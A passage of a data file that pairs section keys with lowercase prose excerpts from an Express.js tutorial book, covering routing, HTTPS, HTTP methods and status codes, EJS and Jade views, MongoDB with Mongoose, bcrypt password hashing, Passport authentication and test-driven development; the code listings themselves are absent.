send a user's profile picture if they visit /users/123/profile_photo. the static middleware has no way of knowing about this, but express has a nice way of doing this, which uses a lot of the same internal mechanisms as the static middleware.", "express-5.4.2.txt__2": "let's say we want to send profile pictures when someone visits /users/:userid/profile_photo. let's also say that we've earlier populated req.user with the user object (with app.param, as we saw before), and each user object has a property called profilephotopath, that holds the local path to the profile photo. here's how we might do that:", "express-5.4.txt__1": "unless you're building a web server that's 100% api (and i mean one hundred percent), you're probably going to send a static file or two. maybe you have some css to send, maybe you have a single-page app that needs some static files sent, and maybe you're a donut enthusiast and have gigabytes of donut photos to serve your hungry viewers.", "express-5.5.txt__1": "as we discussed earlier in the chapter, https is http's more secure sister. it adds a secure layer to http, adding more security (although nothing is invincible). this secure layer is called tls or ssl. the names are used interchangeably, but tls is technically the successor to ssl.", "express-5.5.txt__2": "if this is a bit confusing, just remember that both peers have a private key and a public key.", "express-5.5.txt__3": "i imagine certificate authorities as a bodyguard. when i'm talking to somebody, i look up at my bodyguard and say \"hey, is this person who they say they are?\". my bodyguard looks down at me and gives a small nod, or maybe a shake of the head.  note some hosting providers like heroku will do all the https for you so that you don't have to worry about it. this section is only useful if you have to do https yourself!", "express-5.5.txt__4": "from there, we'll run the following two commands:  listing 5.16 using openssl to create your private key and signing request  #a this generates your private key into privatekey.pem.  #b this generates a certificate signing request into request.pem. you'll have to fill out a bunch of information.", "express-5.6.1.txt__1": "for this application, we'll use four node packages: express (obviously), reckon (for grabbing weather data), zippity-do-dah (for turning zip codes into latitude/longitude), and ejs (for rendering html views). (these are some pretty good names, right? especially \"zippity-do-dah\".)  make a new express application. you'll want to make sure the package.json looks something like this when it's time to start:  listing 5.19 package.json for this application  make sure you have all of these dependencies installed by running npm install in your application's directory.", "express-5.6.3.txt__1": "there are two views in this application; the 404 page and the homepage. we want our site to look consistent across pages, so let's make a template. we'll need to make a header and a footer.  let's start with the header. save the following into a file called header.ejs:  listing 5.21 views/header.ejs  next, let's close off the page in footer.ejs:  listing 5.22 views/footer.ejs  now that we have our template, let's fill in the simple 404 page (as 404.ejs):  listing 5.23 views/404.ejs  the index homepage isn't too complex, either. save this sucker as index.ejs.  listing 5.24 views/index.ejs  there are a couple of references to the pure css framework in the index code; all they do is apply some styling so our page looks a little better.  speaking of styling, we'll need to fill in the.css that we specified in the layout. save the following into public/the.css:  listing 5.25 public/the.css  this css effectively centers all the page's content, both horizontally and vertically. this isn't a css book, so don't worry if you don't understand exactly what's going on in the above.", "express-5.6.txt__1": "let's take what we've learned and build a simple web application that returns the temperature by your united states zip code.", "express-5.txt__1": "as we've seen, routing is one of express's big features, allowing you to map different requests to different request handlers. in this chapter, we'll go far more in depth. we'll look at routing in detail, how to use express with https, express 4's new routers feature, and more. we'll also build a couple of routing-centric applications, one of which will be a running example throughout the book.", "express-6.1.txt__1": "let's talk about a simple json api and how it could be used so that we see a concrete example of the kind of thing we'll be building.", "express-6.3.1.txt__1": "the http spec defines methods like this:  the method token indicates the method to be performed on the resource identified by the request-uri. the method is case-sensitive.  ugh, that's hard to read.  a human might understand it this way: a client sends an http request to the server with a method. they can choose any method they want, but there are really only a handful that you use. the server sees that method and responds accordingly.  there's nothing baked into http that prevents it from defining any method you want, but web applications typically use the following four:  1. get is probably the most common http method anyone uses. as the name suggests, it gets resources. when you load someone's homepage, you get it. when you load an image, you get it. get methods shouldn't change the state of your app; the other methods do that.", "express-6.3.1.txt__2": "2. post is another common one, and is generally used to request a change to the state of the server. you post a blog entry; you post a photo to your favorite social network; you post when you sign up for a new account on a website. post is used to create records on servers, not modify existing records -- that's what put and delete are for, as discussed below.", "express-6.3.1.txt__3": "post is also used for actions, like \"buy this item\".  post, unlike get, is non-indempotent. that means that the state will change the first time you post, and the second time, and the third time, and so on.", "express-6.3.1.txt__4": "put has another interesting part; if you try to put changes to a record that doesn't exist, the server can (but doesn't have to) create that record. you probably wouldn't want to update a profile that doesn't exist, but you might want to update a page on a personal website whether it exists or not.", "express-6.3.1.txt__5": "put is idempotent, which wasn't immediately intuitive to me, but it eventually made sense. let's say i'm \"evan hahn\" on a website but i want to change it to \"max fightmaster\". i don't put \"change name from evan hahn to max fightmaster\"; i put \"change my name to max fightmaster; i don't care what it was before\". this allows it to be idempotent; i could do this once or 500 times, and my name would still be max fightmaster.", "express-6.3.1.txt__6": "4. delete is probably the easiest to describe. like put, you basically specify \"delete record 123\". you could delete a blog entry, or delete a photo, or delete a comment. that's it!", "express-6.3.1.txt__7": "there's nothing that strictly enforces these constraints -- you could theoretically use get requests to do what post requests should do, for example -- but it's bad practice and against the http specification. it's not what people expect. many browsers also have different behaviors depending on the type of http request, so you always make an effort to use the right ones.", "express-6.3.1.txt__8": "http specifies a number of other verbs, but i've never had a need to stray very far from those four.", "express-6.3.1.txt__9": "in express, you've already seen how to handle different http methods. to refresh your memory, here's a simple application that responds to each different method with a little message:  listing 6.4 handling different http verbs", "express-6.3.2.txt__1": "let's recall our photo-sharing app. here's how you might envision that in crud style:  \u00b7   users can upload photos; this is the create step.  \u00b7   users can browse photos; this is the read part.  \u00b7   users can update photos, perhaps by giving them different filters or changing captions; this would be an update.  \u00b7   users can delete photos from the website.  if you're like me, you didn't immediately see the connection between crud and the four main http verbs i listed above. but if get is for reading resources, and post is for creating resources...woah! we see the following:  \u00b7   create = post  \u00b7   read = get  \u00b7   update = put  \u00b7   delete = delete  the four main http methods lend themselves pretty well to crud-style applications, which are very common on the web.  post versus put  post versus put  there's a little bit of debate about which http verbs correspond to which crud operations. most people agree that read == get and delete == delete, but create and update are a little murkier.  because put can create records just like post can, one could say that put better corresponds to create. put can both create and update records, so why not put it in both spots?", "express-6.4.txt__1": "let me walk you through a scenario.  you design a public api for your timezone app and it becomes a big hit. people all over the world are using it. people are using it to find times all across the globe. it's working well.", "express-6.5.5.txt__1": "the 400 range is the largest, and it generally means that something about the request was bad. in other words, the client screwed something up and it's not the server's fault. there are a lot of different errors here.  401 and 403 authentication errors  there are two different errors for failed client authentication, and they're 401 (\"unauthorized\") and 403 (\"forbidden\"). the words \"unauthorized\" and \"forbidden\" sound pretty similar\u2014what's the difference between those two?  in short, a 401 error is when the user isn't logged in at all. a 403 error is when the user is logged in as a valid user, but they don't have permissions to do what they're trying to do.", "express-6.5.6.txt__1": "the final range in the http specification is the 500 range, and while there are several errors in here, the most important one is 500: \"internal server error\". unlike 400 errors, which are the client's fault, 500 errors are the server's fault. this can be any number of things, from an exception to a broken connection to a database.", "express-6.5.6.txt__2": "ideally, you should never be able to cause a 500 error from the client\u2014that means that your client can cause bugs in your server.", "express-6.5.txt__1": "every http response comes with an http status code. the most famous one is 404, which stands for \"resource not found\". you've likely seen 404 errors when visiting a url that the server can't find\u2014maybe you've clicked an expired link or typed a url wrong.", "express-6.5.txt__2": "it turns out that there are a lot more http status codes than 404 and 200, each with a different meaning. there are a handful of 100 codes (like 100 and 101), several in the 200s, 300s, 400s, and 500s. the ranges aren't \"filled\"--that is, the first four codes are 100, 101, 102, and then it skips all the way to 200.", "express-6.5.txt__3": "each range has a certain theme. steve losh sent a great tweet that summarizes them (which i had to paraphrase a bit), as told from the perspective of the server:  http status ranges in a nutshell:  1xx: hold on  2xx: here you go  3xx: go away  4xx: you messed up  5xx: i messed up  @stevelosh, https://twitter.com/stevelosh/status/372740571749572610  i love that summary. (the real one is a little more vulgar.)", "express-6.5.txt__4": "wikipedia has a great list of every standard (and some nonstandard) http response code at https://en.wikipedia.org/wiki/list_of_http_status_codes , but there are a few that really pertain to building an api with express. we'll go through each range (the 100s, then the 200s, etc) and explain some common http codes you should be setting in your applications.", "express-6.5.txt__5": "what about http 2? most http requests are http 1.1 requests, with a handful of them still using version 1.0. http 2, the next version of the standard, is slowly being implemented and rolled out across the web. luckily for us, most of the changes happen at a low level and you don't have to deal with them. it does define one new status code\u2014421\u2014but that shouldn't affect you much.", "express-6.txt__1": "friends, gather round. this chapter marks a new beginning. today, we exit the abstract but critical \"core express\" and enter the real world. for the rest of this book, we'll be building much more real systems atop express. we'll start with apis.  \"api\" is a pretty broad term.", "express-6.txt__2": "at a high level, apis are just ways for one piece of code to talk to another piece of code. this could mean a computer talking to itself or a computer talking to another computer over a network. for example, a video game might consume an api that allows the code to draw graphics to the screen. we've seen a few methods available in the express api, like app.use or app.get. these are just interfaces that you as a programmer can use to \"talk to\" other code.", "express-6.txt__3": "there are also computer-to-computer apis. these happen over a network, and usually over the internet. these computers may be running different programming languages and/or different operating systems, so they've developed common ways to communicate. some simply send plain text, while others might choose json or xml. either way, both parties have to agree that they're going to send data a certain way. in this chapter, the apis we create will use json.", "express-6.txt__4": "we'll talk about apis that interact you can build with express. these apis will take http requests and respond with json data.", "express-6.txt__5": "note if you want to learn a lot more about http, check out appendix a which is a detailed overview of http.", "express-7.1.1.txt__1": "we've seen simple examples of how to render views before, but just in case, here's an app that renders a simple ejs view:  listing 7.1 simple view rendering example  #a first, we require what we need and create our application.  #b this tells express that any file ending in \".ejs\" should be rendered with whatever comes out of require(\"ejs\"). this is a convention followed by some view engines; we'll later see how to use view engines that don't conform to this convention. .  #c this tells express where your views directory is. it happens to default to this, but i much prefer to be explicit. this also makes sure things work on windows.      &nbsp.  #d when we visit the root, we'll render a file called \"index\". this resolves to \"views/index.ejs\", which is then rendered with ejs.          &nbsp.  #e this starts the server on port 3000!", "express-7.1.2.txt__1": "here's a complex example of rendering a view from a response, using two different view engines: jade and ejs. this should illustrate how crazy this can get:  listing 7.3 complex rendering example  here's what happens when you call render in these three cases. while it looks complicated at a high level, it's just a number of straightforward steps:", "express-7.1.2.txt__2": "2. next, we decide whether view caching is enabled. \"view caching\" might sound like express caches the entire view rendering process, but it doesn't; it only caches the lookup of the view file and its assignment to the proper view engine. for example, it will cache the lookup of views/my_view.ejs and figure out that this view uses ejs, but it won't cache the actual render of the view. a bit misleading!", "express-7.1.2.txt__3": "it decides whether view caching is enabled in two ways, only one of which is documented.  the documented way: if app.enabled(\"view cache\") is truthy. by default, this is disabled in development mode and enabled in production, but you can change it yourself with app.enable(\"view cache\") or app.disable(\"view cache\").", "express-7.1.2.txt__4": "3. next, we have to look up where the view file resides and what view engine to use. in this case, we want to turn \"about\" into /path/to/my/app/views/about.jade + jade and \"contact.ejs\" into /path/to/my/app/views/contact.ejs + ejs. the 404 handler should associate 404.html with ejs by looking at our earlier call to app.engine. if we've already done this lookup before and view caching is enabled, we'll pull from the cache and skip to the final step. if not, we'll continue on.", "express-7.1.2.txt__5": "4. if you don't supply a file extension (like with \"about\"), express appends the default you specify. in this case, \"about\" becomes \"about.jade\" but \"contact.ejs\" and \"404.html\" stay the same. if you don't supply an extension and don't supply a default view engine, express will throw an error. otherwise, it'll continue on.", "express-7.1.2.txt__6": "5. now that we definitely have a file extension, express looks at the extension to determine which engine to use. if it matches any engine you've already specified, it'll use that. in this case, it'll match jade for about.jade because it's the default. contact.ejs will try to require(\"ejs\") based on the file extension. we explicitly assigned 404.html to ejs's renderfile function, so it'll use that.", "express-7.1.2.txt__7": "6. express looks the file up in your views directory. if it doesn't find the file, it throws an error, but it'll continue if it finds something.  7. if view caching is enabled, we cache all this lookup logic for next time.  8. finally, we render the view! this calls out to the view engine and is literally one line in express's source code. this is where the view engine takes over and produces actual html (or whatever you'd like).  this turns out to be a bit hairy, but the 99% case is \"i pick one view engine and stick with it\", so you're likely to be shielded from most of this complexity.  rendering non-html views  rendering non-html views", "express-7.1.3.txt__1": "we've talked about some view engines like ejs and jade already, but there are plenty more that you might want to choose. you might've heard of mustache, handlebars, or underscore.js's templating. you might also want to use a node port of other templating languages like jinja2 or haml.  many of these view engines will \"just work\" with express, like ejs and jade. others, however, don't have an express-compatible api, and need to be wrapped in something express can understand.", "express-7.1.txt__1": "before i begin, let me define a term i'll be using a lot: view engine. when i say \"view engine\", i basically mean \"module that does the actual rendering of views\".  jade and ejs are view engines, and there are many others.", "express-7.2.1.txt__1": "ejs can be used for templating html, but it can be used for anything. let's take a look at a short bit of ejs, and what that looks like when you render it.  listing 7.5 an ejs template  if we passed the following context to ejs...  listing 7.6 an ejs context  then we'd get the following result (as of 2014, anyway):  this little example shows four major features of ejs: javascript that's evaluated, escaped, and printed, javascript that's evaluated but not printed, javascript that's evaluate and printed (but not escaped for html), and filters.", "express-7.2.1.txt__2": "you can also run arbitrary javascript and keep it from being printed. this is useful for things like loops and conditionals, as we see in the above example. this is done with <% expression %>. as you can see, you can use brackets to group loops and conditionals across multiple lines.", "express-7.2.txt__1": "one of the simplest and most popular view engines out there is called ejs, for \"embedded javascript\". it can do templating for simple strings, html, plain text\u2014you name it\u2014it lightly integrates itself with whatever tool you use. it works in the browser and node.js. if you've ever used erb from the ruby world, ejs is very similar. in any case, it's pretty simple!", "express-7.2.txt__2": "warning there are actually two versions of ejs maintained by two different groups of people. they're similar, but not identical. the one we'll be using is by tj holowaychuck, the creator of express. if you look for a package called \"ejs\" on npm, this is the one you'll find. but if you visit http://embeddedjs.com/, you'll find a very similar library claiming with the same name. a lot of the functionality is the same, but it's a different library last updated in 2009. it doesn't work in node, and it's even got some debatably-sexist sentences in its documentation; avoid it!", "express-7.3.txt__1": "view engines like handlebars, mustache, and ejs don't completely replace html\u2014they augment it with some new features. this is really nice if you have designers, for example, who've already learned html and don't want to learn a whole new language. it's also useful for non-html-like templating solutions. if you're in this sort of situation, jade is probably the wrong choice.", "express-7.3.txt__2": "but jade also promises some other features. it allows you to write far fewer lines of code and the lines you write are much prettier. doctypes are easy; tags are nested by indentation, not close tags. it's got a number of ejs-style features built into the language, like conditionals and loops. it's more to learn, but more powerful.", "express-7.txt__1": "in the previous chapters, we learned what express is, how express works, and how to use its routing feature. starting in this chapter, we're going to stop learning about express!", "express-7.txt__2": "in this chapter we will talk about views. views are great. they give us a convenient way to dynamically generate content (usually html). we've seen a view engine before; jade has helped us clean up some ugly html code and inject special variables inside. but while jade gave us a conceptual understanding of views, we never really explored everything that express (and the other view engines) had to offer. we'll learn the many ways to inject values into templates, see the features of jade and ejs and other express-compatible view engines, and some subtleties in the world of views.", "express-8.1.1.txt__1": "before we start, let's talk about how mongo works.  most applications have one database, like mongodb. these databases are", "express-8.1.1.txt__2": "to access these databases, you'll run a mongodb server. clients will talk to these servers, viewing and manipulating the database. there are client libraries for most programming languages; these libraries are called drivers and let you talk to the database in your favorite programming language. in this book, we'll be using the node.js driver for mongodb.", "express-8.1.1.txt__3": "every database will have one or more collections. i like to think of collections as fancy arrays. a blog application might have a collection for blog posts, or a social network might have a collection for user profiles. they're like arrays in that they're just giant lists, but you can also query them (\"give me all users in this collection older than age 18\", for example) much more easily than arrays.", "express-8.1.1.txt__4": "every collection will have any number of documents. documents aren't technically stored as json, but you can think of them that way; they're basically objects with various properties. documents are things like users and blog posts; there is one document per thing. documents don't have to have the same properties, even if they're in the same collection\u2014you could theoretically have a collection filled with completely different objects (although you seldom do this in practice).", "express-8.1.1.txt__5": "documents look a lot like json, but they're technically something called binary json, or bson. you almost never deal with bson directly; rather, you'll translate to and from javascript objects. the specifics of bson encoding and decoding are a little different from json. bson also supports a few types that json does not, like dates, timestamps, and undefined values.", "express-8.1.1.txt__6": "here's a diagram that shows how things are put together:  figure 8.1 hierarchy of mongo's databases, collections, and documents", "express-8.1.2.txt__1": "if you come from a relational/sql background, many of mongo's structures map one-to-one with structures from the sql world. (if you're not familiar with sql, you can skip this section!)", "express-8.1.2.txt__2": "collections in mongo correspond to sql's tables. mongo's collections contain many documents, where sql's tables contain many rows. once again, mongo's collections don't enforce a schema, which is unlike sql. in addition, these documents can embed other documents, unlike in sql\u2014blog posts could contain the comments, which would likely be two tables in sql. in a blog application, there would be one mongo collection for blog posts or one sql table. each mongo collection contains many documents, where each sql table contains many rows or records.", "express-8.1.2.txt__3": "databases in mongo are very similar to databases in sql. generally, there is one database per application. mongo databases can contain many collections, where sql databases can contain many tables. a social networking site would likely have one database in either sql or mongo.  for a full list of \"translations\" from sql terminology to mongodb terminology (queries, too!), check out the official sql to mongodb mapping chart at http://docs.mongodb.org/manual/reference/sql-comparison/index.html.", "express-8.1.3.txt__1": "you'll want to install mongo locally so that you can use it while you're developing.", "express-8.1.3.txt__2": "if you're on osx and would prefer to use the command line, you can use the homebrew package manager to install mongodb with a simple brew install mongodb. if you're using macports, sudo port install mongodb will do the job. if you're not using a package manager and you don't want to use mongo.app, you can download it from the mongodb downloads page at http://www.mongodb.org/downloads.", "express-8.1.3.txt__3": "if you're on ubuntu linux, mongo's website has helpful instructions at http://docs.mongodb.org/manual/tutorial/install-mongodb-on-ubuntu/. if you're using a debian distribution like mint (or debian!), check out the official documentation at http://docs.mongodb.org/manual/tutorial/install-mongodb-on-debian/. other linux users can check out http://docs.mongodb.org/manual/tutorial/install-mongodb-on-linux/.", "express-8.1.3.txt__4": "if you're a windows user or on any of the oses i didn't mention above, the mongodb downloads page will help you. you can either download it from their website or scroll down to the bottom of that page to see other package managers that have mongo. take a look at http://www.mongodb.org/downloads. if you can, make sure you download the 64-bit version; the 32-bit version has a limit on storage space.", "express-8.1.txt__1": "mongodb (often shortened to mongo) is a popular database that's wiggled its way into the hearts of many node developers. its pairing with express is beloved enough to have spawned the acronym \"mean\", for mongodb, express, angular (a front-end javascript framework), and node. in this book, we'll be discussing everything but the \"a\" of that acronym...the men stack, if you will.", "express-8.1.txt__2": "at this point, you may be saying, \"there are a lot of choices for databases out there, like sql or apache cassandra couchbase. why choose mongodb?\" that's a good question!  in general, web applications store their data in one of two kinds of databases: relational and non-relational.", "express-8.1.txt__3": "non-relational databases, on the other hand, are often called \"nosql\" databases. i like to imagine \"nosql\" as both a different technology and a fist-up cry against the status quo. perhaps \"nosql\" is tattooed on a protester's arm. in any case, it's different from relational databases in that it is generally unstructured. each entry can contain, well, whatever you want. this is very much like javascript in this way; javascript is generally less rigid. in general, nosql databases \"feel\" more like javascript.", "express-8.1.txt__4": "for this reason, we choose a nosql database. the nosql database we'll choose is called mongodb. but why choose that?", "express-8.1.txt__5": "mongo is popular in part because it's mature, feature-filled, and reliable. it's written in performant c++ and is trusted by lots and lots of users.  while mongo isn't written in javascript, its native shell is written in javascript. that means that when you open mongo to play around in the command line, you send it commands with javascript. it's pretty nice to be able to \"talk to\" the database with a language you're already using!  i also chose mongo for this chapter because i think it's easier to learn than sql, especially for a javascript developer. sql is a powerful programming language unto itself, but you already know javascript!", "express-8.2.1.txt__1": "in order to learn the topics in this chapter, we'll develop a very simple social network application. this app will let users register new profiles, edit those profiles, and browse each others' profiles. we'll call it \"learn about me\", for lack of a creative name. we'll call it \"lab\" for short.  our site will have a few pages on it:  \u00b7   the homepage, which will list all users. clicking on a user in the list will take you to their profile page.  \u00b7   the profile page will show the user's display name (or username if no display name is defined), the date they joined the site, and their biography.  \u00b7   the user will be able to sign up for a new account, log into accounts, and log out.  \u00b7   after signing up, users will be able to edit their display names and biographies, but only when they're logged in.  as always, create a new directory for this project. as always, we'll need to create a package file with metadata about our project and its dependencies. create a package.json file and put this inside:  listing 8.1 package.json for lab  your dependency versions may vary.", "express-8.2.2.txt__1": "as we've discussed, mongodb stores everything in bson, which is a binary format. a simple \"hello world\" bson document might look like this internally:", "express-8.2.2.txt__2": "models can serve as a simple object that stores database values, but they often have things like data validation, extra methods, and more. as we'll see, mongoose has a lot of those features.  in this example, we'll be building a model for users. before we start, we should consider the properties user objects should have:  \u00b7   username, a unique name. this will be required.  \u00b7   password. this will also be required.  \u00b7   time joined, a record of when the user joined the site.  \u00b7   display name, name that's displayed instead of the username. this will be optional.  \u00b7   biography, an optional bunch of text that's displayed on the user's profile page.  to specify this in mongoose, we must define a schema, which contains information about properties, methods, and more. (personally, i don't think \"schema\" is the right word; it's a lot more like a class or a prototype.) it's pretty easy to translate the english above into mongoose code.  create a folder called models in the root of your project, and create a new file called user.js inside that folder. to start, put the following contents:  listing 8.2 defining the user schema (in models/user.js)", "express-8.2.2.txt__3": "once we've created the schema with the properties, we can add some methods to it. the first we'll add is simple: get the user's name. if the user has defined a display name, return that; otherwise, return their username. here's how we'll add that:  listing 8.3 adding a simple method to the user model (in models/user.js)", "express-8.2.2.txt__4": "first, to start using bcrypt, add the require statement to the top of your file. bcrypt works by running a part of the algorithm many times to give you a secure hash, but that number of times is configurable. the higher the number, the more secure the hash but the longer it will take. we'll use a value of 10 for now, but we could increase that number for higher security (but, once again, slower speed):", "express-8.2.2.txt__5": "listing 8.4 requiring bcrypt (in models/user.js)  next, after you've defined your schema, we'll define a pre-save action. before we save our model to the database, we'll run some code that will hash the password. here's how that looks:  listing 8.5 our pre-save action to hash the password (in models/user.js)  #1 we'll define a function that will be run before our model is saved.  #2 because we'll be using inner functions, we'll save a reference to the user.  #3 skip this logic if the user hasn't modified their password.  #4 we'll generate a salt for our hash, and call the inner function once completed.  #5 next, we'll hash the user's password with that generated salt.  #6 store the password and continue on with the saving!  now, we never have to call any fancy logic to hash the password for the database\u2014it'll happen every time we save.  finally, we'll need to write some code to compare the real password to a password guess. when a user logs in, we'll need to make sure the password they typed is correct. let's define another method on the model to do this:  listing 8.6 checking the user's password (in models/user.js)  #1 for complicated security reasons, we'll use bcrypt's compare function rather than something like a === check.  now we'll be storing our users' passwords securely!", "express-8.2.3.txt__1": "now that we've defined our model, we'll want to...well, use it! we'll want to do things like list users, edit profiles, and register new accounts. while defining the model and its schema can be a little hairy, using it could hardly be easier; let's see how.  in order to start using it, let's first create a simple app.js in the root of our project which will set up our app. this is incomplete and we'll come back and fill in some more later, but for now, here's what we'll do:  listing 8.9 app.js, to start  #1 require everything we need, including mongoose.  #2 we'll put all of our routes in another file.  #3 connect to our mongodb server in the test database.  above, we've specified that we're going to be using an external routes file. let's define that too:  listing 8.10 routes.js, to start  #1 we'll come back to this, but this sets a few useful variables for our templates. if you don't understand it yet, don't worry\u2014it'll return.  #2 this queries the users collection, returning the newest users first.  these two files have a few new things we haven't seen before.", "express-8.2.3.txt__2": "second, we're grabbing a list of users with user.find. then we sort these results by the createdat property, and then we run the query with exec. we don't actually run the query until exec is called. as we'll see, we can also specify a callback in find to skip having to use exec, but then we can't do things like sorting.", "express-8.3.1.txt__1": "when setting up passport, you'll need to do three things:  1. set up the passport middleware; this is pretty easy.  2. tell passport how to serialize and deserialize users. this is a short amount of code that effectively translates a user's session into an actual user object.  3. tell passport how to authenticate users. in this case, this is the bulk of our code, which will instruct passport how to talk to our mongo database.  let's get started.  setting up the passport middleware  in order to initialize passport, you'll need to set up three official express middlewares, a third-party middleware, and then two passport middlewares. for your reference, they are:  1. body-parser  2. cookie-parser  3. express-session  4. connect-flash  5. passport.initialize  6. passport.session", "express-8.3.1.txt__2": "after that, make sure you require passport and then you'll use two middleware functions it provides. put these at the top of your application (and make sure you require them, too):  listing 8.19 setting up the middleware for passport (in app.js)  #1 the session needs something called a \"session secret\", which allows each session to be encrypted from the clients. this deters hackers from hacking into users' cookies. it needs to be a bunch of random characters (not necessarily what i have above!).  #2 the session middleware requires this option to be set, which forces the session to be re-set even when it hasn't been modified.  #3 saveuninitialized is another required option. this also resets sessions but resets ones that are uninitialized.  once you've set that up, you'll be ready to move on to the next step: telling passport how to extract users from the session.  serializing and deserializing users  passport needs to know how to serialize and deserialize users. in other words, we'll need to translate a user's session into an actual user object, and vice-versa. passport's documentation does a better job describing it than i could:  in a typical web application, the credentials used to authenticate a user will only be transmitted during the login request. if authentication succeeds, a session will be established and maintained via a cookie set in the user's browser.       each subsequent request will not contain credentials, but rather the unique cookie that identifies the session. in order to support login sessions, passport will serialize and deserialize user instances to and from the session.  to keep our code separated, we'll be defining a new file called setuppassport.js. this file will export a single function that will, not surprisingly, set up this passport stuff. create setuppassport.js and require it from app.js:  listing 8.20 requiring and using passport setup (in app.js)  now, let's fill in our passport setup.  because all of our user models have a unique _id property, we'll use that as our \"translation\". first, make sure you require your user model:  listing 8.21 require your user model  next, instruct passport how to serialize and deserialize users from their id. this code can be placed before or after the passport middleware; place it where you'd like!  listing 8.22 serializing and deserializing users (in setuppassport.js)  #1 serializeuser should turn a user object into an id. we call done with no error and the user's id.  #2 deserializeuser should turn the id into a user object. once we're done, we call done with any errors and the user object.  now, once the session is dealt with, it's time to do the hard part: the actual authentication.  the real authentication", "express-8.3.txt__1": "in this chapter, we've been creating \"learn about me\", a website that lets users create and browse profiles. we've implemented the homepage, the \"view profile\" page, and even signup!", "express-8.3.txt__2": "for this, we'll choose passport. to quote its documentation, \"passport is authentication middleware for node. it is designed to serve a singular purpose: authenticate requests.\" we'll be dropping this middleware into our application, writing a little code to wire up our users, and we'll be in business! passport takes away a lot of the headache for us.", "express-8.3.txt__3": "it's important to remember that passport doesn't dictate how you authenticate your users; it's only there to provide helpful boilerplate code. it's like express in that way. in this chapter, we'll look at how to use passport to authenticate users stored in a mongodb database, but passport supports authentication with providers like facebook, google, twitter, and over 100 more. it's extremely modular and powerful!", "express-8.txt__1": "i have three favorite chapters in this book.  you've already passed my first favorite: chapter 3, where we discuss the foundations of express. i like that chapter because the goal is to really explain express. in my opinion, it's the most important chapter of the book, because it explains the framework conceptually.  chapter 10 is the second of my three favorites. as you'll see, it discusses security, and i love putting a hacker hat on and trying to break express applications. it's a lot of fun (and, incidentally, terribly important).", "express-8.txt__2": "nearly every application has some kind of data, be it blog posts or user accounts or cat pictures. as we've discussed, express is generally an unopinionated framework. fitting in with this unopinionated mantra, express doesn't dictate how you store your data. so how should we approach it?", "express-8.txt__3": "you could try to store your application's data in files, by writing to a file or multiple files. this is how many databases work internally, after all. but that leaves you to figure out how to structure and query that data. how do you save your data? how do you efficiently get data out of those files when you need it? you might wind up building a database of your own, which is a huge headache. and once again, this doesn't magically work with multiple servers.", "express-9.1.1.txt__1": "imagine you're writing a little javascript that resizes images to proper dimensions; this is a common task in web applications. when passed an image and dimensions, your function will return the image resized to those dimensions. perhaps your boss has assigned this task, or perhaps it's your own impetus, but in any case, the specifications are pretty clear.", "express-9.1.1.txt__2": "let's say that i've convinced you to write automated tests for this; the paragraphs above have moved you. when do you write the tests? you could write the image resizer and then write the tests, but you could also switch things up and write the tests first.  writing tests first has a number of advantages.", "express-9.1.1.txt__3": "you've probably used an api that's really pleasant to work with. the code is simple and intuitive. when you write tests first, you're forced to think about how your code should work before you've even written it. this can help you design what some people call \"dream code\"; the easiest interface to your code. tdd can help you see the big picture about how your code should work and make for a more elegant design.", "express-9.1.1.txt__4": "this \"write tests first\" philosophy is called test-driven development, shortened to tdd. it's so named because your tests dictate how your code forms.", "express-9.1.1.txt__5": "and if you're not writing tests at all, then tdd is contrary to your very philosophy and you won't write tests at all!", "express-9.1.1.txt__6": "how tdd works: red, green, refactor  the tdd cycle usually works in three repeating steps, called red, green, refactor, as shown in figure 1.  figure 9.1 the repeating red-green-refactor cycle of tdd.", "express-9.1.1.txt__7": "2. step 2 is the \u201cgreen\u201d step. now that you've written all of your tests, you begin to \u201cfill in\u201d the real code to satisfy all the tests. as you make progress, your tests will slowly go from red (failing) to green (passing). like the previous step, it's called the \u201cgreen\u201d step because you typically see green for a passing test. once you're all green (all of your tests pass), you're ready for the final step.", "express-9.1.1.txt__8": "3. step 3 is the \u201crefactor\u201d step. if all of your tests are green, that means all of your code works, but it might not be perfect. perhaps one of your functions is slow or you've chosen bad variable names. like a writer cleaning up a draft of a book, you go back and clean up the code. because you have all of your tests, you can refactor without worrying that you're breaking some unforeseen part of your code.", "express-9.1.1.txt__9": "4. step 4 is to repeat the process. you probably haven't written all of your code for the project, so go back to step 1 and write some tests for the next part.  here's how we might use red-green-refactor for our image resizer:  \u00b7   first, the \u201cred\u201d step. we'd write some of our tests. for example: if we pass it a jpeg image, our function should return a jpeg image; if we pass it a png image, our function should return a png image. these tests aren't complete, but it's a good starting point.", "express-9.1.2.txt__1": "in short, you can almost never have too many tests.", "express-9.1.2.txt__2": "because of that, you want to test as much of your code as you can. you want to poke at every (reasonable) nook and cranny of your software to make sure it performs as you expect. the more passing tests you have, the more you approach certainty that your code works as you expect. you can never be 100% sure\u2014something might break somewhere along the line that you didn't think of\u2014but if you've thrown everything you can possibly think of at your code, it's probably working.", "express-9.1.2.txt__3": "code coverage  code coverage  testing can make you more confident about your code, but it's just one method. as we discussed at the beginning of the chapter, there are plenty of methods like peer reviews and code linters. an extension of testing to further boost your confidence is the idea of code coverage.", "express-9.1.txt__1": "it should come as no surprise that there is often a disconnect between how you envision your code behaving and how it actually behaves. no programmer has ever written bug-free code 100% of the time; this is part of our profession.", "express-9.1.txt__2": "we can write automated tests, which effectively puts these desires into code. we write code that says \"make sure, with our calculator, that 1 + 1 = 2, and that 12 \u00f7 3 = 4\". this is effectively a specification for your program, but it's not written in english\u2014it's written in code for the computer, which means that you can automatically verify it. \"testing\" is usually short for \"automated testing\", and it's simply when test code is run that verifies your \"real\" code.", "express-9.1.txt__3": "this automatic verification has a number of advantages.  most importantly, you can be much more confident about your code's reliability. if you've written a rigorous specification that a computer can automatically run against your program, you can be much more confident about its correctness once you've written it.", "express-9.2.1.txt__1": "testing in node.js applications has three major parts: the \u201creal\u201d code (written by you), the testing code (written by you), and the test runner (usually a third-party module, probably not written by you).  1. the \u201creal\u201d code is whatever you want to test. this might be a function, or a database model, or an express server. in a node.js context, this is anything that assigns anything to module.exports.  2. the test code tests your \u201creal\u201d code. these will require whatever you want to test and then start asking questions about it. does the function return what it should return? do your objects behave as they should behave?", "express-9.2.2.txt__1": "let's take a stab at writing a first version of this. create a new directory and create one file inside: capitalize.js, then put the following inside:  listing 9.1 a first version of the capitalize function (in capitalize.js)  if we just eyeball the code, it looks like it should work, but let's write some tests to become more confident about that.  create a package.json file in the same directory, which should contain the following:  listing 9.2 the package.json for the capitalize function  #a as always, your version numbers may vary.  #b when you type \u201cnpm test\u201d, this will run mocha to run your tests.  we're using two modules here: mocha and chai.", 